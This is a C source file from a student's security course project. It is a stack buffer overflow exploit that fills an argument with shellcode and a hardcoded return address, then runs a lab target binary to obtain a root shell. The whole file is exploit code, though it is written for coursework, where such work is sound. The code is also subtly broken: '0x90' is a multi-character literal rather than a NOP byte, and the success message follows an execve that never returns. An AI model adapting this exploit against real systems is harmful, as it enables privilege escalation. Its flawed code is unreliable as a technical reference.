/**
CS6332.501
Project 5
Submitted by Konchady Gaurav Shenoy (kxs168430)
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define DEFAULT_OFFSET 0
#define TARGET "/tmp/target1"


unsigned long get_stackpointer(void) {
      __asm__("movl %esp,%eax");
}


int main(int argc, char *argv[])
{
  int offset_value=DEFAULT_OFFSET;

  if (argc > 1) offset_value = atoi(argv[1]);
  char *args[3];
  char *env[1];
  env[0]=args[2]=NULL;
  args[0] = TARGET; 
  args[1] = malloc(529);
  long addr = get_stackpointer() - offset_value;
   
  printf("Current Address in use: 0x%x\n", addr);   
  int i=0;

  while(i< 529)
   {
     args[1][i++]='0x90';
   }

   memcpy(args[1], shellcode, strlen(shellcode));
   *(unsigned int *)(args[1] + 524) = 0xbffffa9f;
   args[1][528]='\0';

  //The Moment of Truth
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  else printf("Root Shell was obtained");

  return 0;
}
